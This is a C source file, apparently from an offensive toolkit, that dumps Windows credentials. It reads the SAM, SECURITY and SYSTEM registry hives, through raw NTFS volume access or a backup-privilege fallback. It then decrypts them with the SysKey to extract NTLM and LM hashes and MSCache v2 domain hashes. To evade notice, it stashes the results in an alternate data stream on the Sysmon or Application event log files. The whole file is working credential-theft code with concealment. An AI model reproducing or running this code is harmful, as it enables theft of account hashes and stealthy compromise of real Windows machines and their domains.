// Plan 2 — SAM + LSA Secrets + MSCache v2 Dump (T1003.002/004/005)
// Raw NTFS volume read → offline hive parse → SysKey decrypt → ADS output
#include "../shared/common.h"
#include "../shared/plan2_sam.h"

// ─── Fallback path: save hives via RegSaveKey (SE_BACKUP_NAME) ───
// Works on any filesystem (ReFS etc.) where raw NTFS parsing is unavailable.

static BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return FALSE;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
        CloseHandle(hTok); return FALSE;
    }
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    SetLastError(ERROR_SUCCESS);
    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hTok);
    // ERROR_NOT_ALL_ASSIGNED (1300) = privilege not present in token (not admin)
    return ok && err != ERROR_NOT_ALL_ASSIGNED;
}

static BOOL ReadHiveFile(PWSTR path, HIVE_DATA* h) {
    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    DWORD sz = GetFileSize(hf, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(hf); return FALSE; }
    // VirtualAlloc so FreeHiveData() (VirtualFree) can release it later
    h->data = (PBYTE)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!h->data) { CloseHandle(hf); return FALSE; }
    DWORD rd = 0;
    BOOL ok = ReadFile(hf, h->data, sz, &rd, NULL) && rd == sz;
    CloseHandle(hf);
    if (!ok) { VirtualFree(h->data, 0, MEM_RELEASE); h->data = NULL; return FALSE; }
    h->size = sz;
    return TRUE;
}

static BOOL FallbackSaveHives(HIVE_DATA* sam, HIVE_DATA* sec, HIVE_DATA* sys) {
    // NOTE: explicit wide literals — SE_BACKUP_NAME is narrow unless UNICODE is
    // defined, and these builds don't define it (caused err 1313 NO_SUCH_PRIVILEGE)
    if (!EnablePrivilege(L"SeBackupPrivilege") || !EnablePrivilege(L"SeRestorePrivilege")) {
        wprintf(L"      [ERR] Failed to enable backup privileges (err=%d)\n", GetLastError());
        return FALSE;
    }

    WCHAR tmpDir[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tmpDir)) return FALSE;

    struct { PCWSTR sub; PCWSTR fname; HIVE_DATA* out; } jobs[] = {
        { L"SAM",      L"bench_sam.hive",      sam },
        { L"SECURITY", L"bench_security.hive", sec },
        { L"SYSTEM",   L"bench_system.hive",   sys },
    };

    BOOL allOk = TRUE;
    for (int i = 0; i < 3; i++) {
        WCHAR path[MAX_PATH];
        swprintf_s(path, MAX_PATH, L"%ls%ls", tmpDir, jobs[i].fname);

        HKEY hKey = NULL;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, jobs[i].sub, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS) {
            wprintf(L"      [ERR] RegOpenKeyEx %s failed\n", jobs[i].sub);
            allOk = FALSE;
            continue;
        }
        LSTATUS lr = RegSaveKeyW(hKey, path, NULL);
        RegCloseKey(hKey);
        if (lr != ERROR_SUCCESS) {
            wprintf(L"      [ERR] RegSaveKey %s failed (err=%d)\n", jobs[i].sub, lr);
            allOk = FALSE;
            continue;
        }
        if (!ReadHiveFile(path, jobs[i].out)) {
            wprintf(L"      [ERR] ReadHiveFile %s failed\n", jobs[i].fname);
            allOk = FALSE;
        }
        DeleteFileW(path);
    }
    return allOk;
}

// ─── Main ───
int wmain(void) {
    wprintf(L"[*] SAM+LSA+MSCache Dump — T1003.002/004/005\n");

    // 1. Open raw NTFS volume (raw NTFS may be unavailable: BitLocker, ReFS...)
    wprintf(L"[1] Opening \\\\.\\C:... ");
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, NULL);
    if (hVol == INVALID_HANDLE_VALUE) { wprintf(L"FAILED\n"); return 1; }

    HIVE_DATA sam = {0}, sec = {0}, sys = {0};
    BOOL s1 = FALSE, s2 = FALSE, s3 = FALSE;
    BOOL rawOk = FALSE;

    NTFS_CONTEXT ctx;
    if (ParseNtfsBoot(hVol, &ctx)) {
        wprintf(L"OK (cluster=%d)\n", ctx.clusterSize);

        // 2. Read MFT
        wprintf(L"[2] Reading MFT... ");
        PBYTE mft = NULL; SIZE_T mftSz = 0;
        if (ReadMft(hVol, &ctx, &mft, &mftSz)) {
            wprintf(L"OK (%lld MB)\n", mftSz / 1024 / 1024);

            // 3. Extract hives
            wprintf(L"[3] Extracting SAM/SECURITY/SYSTEM... ");
            s1 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
                L"\\Windows\\System32\\config\\SAM", &sam);
            s2 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
                L"\\Windows\\System32\\config\\SECURITY", &sec);
            s3 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
                L"\\Windows\\System32\\config\\SYSTEM", &sys);
            VirtualFree(mft, 0, MEM_RELEASE);
            wprintf(L"%s/%s/%s (%lld/%lld/%lld bytes)\n",
                s1?L"SAM":L"FAIL", s2?L"SEC":L"FAIL", s3?L"SYS":L"FAIL",
                sam.size, sec.size, sys.size);
            rawOk = s1 && s3;
        } else {
            wprintf(L"FAILED\n");
        }
    } else {
        wprintf(L"Not NTFS\n");
    }
    CloseHandle(hVol);

    if (!rawOk) {
        wprintf(L"      [i] Raw NTFS failed — falling back to RegSaveKey (backup privilege)...\n");
        FreeHiveData(&sam); FreeHiveData(&sec); FreeHiveData(&sys);
        if (!FallbackSaveHives(&sam, &sec, &sys)) {
            wprintf(L"      [ERR] Fallback also failed\n");
            return 1;
        }
        s1 = sam.data != NULL; s2 = sec.data != NULL; s3 = sys.data != NULL;
    }

    // 4. Extract SysKey
    wprintf(L"[4] Extracting SysKey... ");
    BYTE sysKey[16];
    if (!Plan2ExtractSysKey(&sys, sysKey)) { wprintf(L"FAILED\n"); return 1; }
    wprintf(L"OK\n");

    // 5. Parse SAM → NTLM hashes
    wprintf(L"[5] Parsing SAM... ");
    NTLM_CRED* creds = NULL;
    DWORD userCnt = Plan2ParseSAM(&sam, sysKey, &creds);
    wprintf(L"%d users\n", userCnt);

    // 6. Parse MSCache
    DWORD cacheCnt = 0;
    WCHAR** cacheNames = NULL, **cacheDoms = NULL;
    PBYTE* cacheHashes = NULL;
    if (s2) {
        wprintf(L"[6] Parsing MSCache v2... ");
        cacheCnt = Plan2ParseMSCache(&sec, &cacheNames, &cacheDoms, &cacheHashes);
        wprintf(L"%d entries\n", cacheCnt);
    } else {
        wprintf(L"[6] MSCache: skipped (no SECURITY hive)\n");
    }

    // 7. Serialize + encrypt + ADS
    wprintf(L"[7] Writing output to ADS... ");
    SIZE_T blobSize = 256 + userCnt * 64 + cacheCnt * 600;
    PBYTE blob = (PBYTE)malloc(blobSize);
    if (blob) {
        PBYTE bp = blob;
        memcpy(bp, "LSAM", 4); bp += 4;
        *(PDWORD)bp = 2; bp += 4;
        *(PDWORD)bp = userCnt; bp += 4;
        *(PDWORD)bp = cacheCnt; bp += 4;

        for (DWORD i = 0; i < userCnt; i++) {
            *(PDWORD)bp = creds[i].rid; bp += 4;
            WORD nl = (WORD)(wcslen(creds[i].name) * 2);
            *(PWORD)bp = nl; bp += 2;
            memcpy(bp, creds[i].name, nl); bp += nl;
            memcpy(bp, creds[i].ntlm, 16); bp += 16;
            memcpy(bp, creds[i].lm, 16); bp += 16;
        }
        for (DWORD i = 0; i < cacheCnt; i++) {
            WCHAR hc[512];
            WCHAR hx[33]; for (int j = 0; j < 16; j++)
                swprintf_s(hx + j * 2, 3, L"%02X", cacheHashes[i][j]);
            swprintf_s(hc, 512, L"$DCC2$10240#%s#%s#%s",
                cacheNames[i], cacheDoms[i]?cacheDoms[i]:L"", hx);
            WORD hl = (WORD)(wcslen(hc) * 2);
            *(PWORD)bp = hl; bp += 2;
            memcpy(bp, hc, hl); bp += hl;
        }
        blobSize = bp - blob;

        static WCHAR* targets[] = {
            L"C:\\Windows\\System32\\winevt\\Logs\\"
            L"Microsoft-Windows-Sysmon%4Operational.evtx",
            L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        };
        for (int i = 0; i < 2; i++) {
            if (WriteToAds(targets[i], L"SAM", blob, blobSize)) {
                wprintf(L"OK\n"); break;
            }
        }
        free(blob);
    }

    // Cleanup
    FreeHiveData(&sam); FreeHiveData(&sec); FreeHiveData(&sys);
    free(creds);
    for (DWORD i = 0; i < cacheCnt; i++) { free(cacheNames[i]); free(cacheDoms[i]); free(cacheHashes[i]); }
    free(cacheNames); free(cacheDoms); free(cacheHashes);

    wprintf(L"[+] %d users, %d cached logins\n", userCnt, cacheCnt);
    return 0;
}
